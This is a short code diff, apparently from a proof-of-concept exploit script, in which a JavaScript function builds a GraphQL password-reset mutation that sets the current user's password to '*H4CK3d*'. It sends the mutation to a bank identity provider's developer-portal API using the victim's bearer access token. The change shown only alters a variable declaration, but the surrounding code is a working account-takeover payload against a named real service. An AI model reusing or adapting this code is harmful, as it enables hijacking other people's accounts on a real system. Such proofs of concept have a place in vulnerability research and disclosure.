@@ -50,7 +50,7 @@ async function sendData() {
     resetPasswdMutationJSON.variables.userId = currentUser;
     resetPasswdMutationJSON.variables.password.newPassword = "*H4CK3d*";
 
-    let xhr = new XMLHttpRequest();
+    xhr = new XMLHttpRequest();
     xhr.open("POST", "https://api.bankid.cz/dev-portal-backend/graphql", false);
     xhr.setRequestHeader("Content-Type", "application/json");
     xhr.setRequestHeader("Authorization", "Bearer " + accessToken);
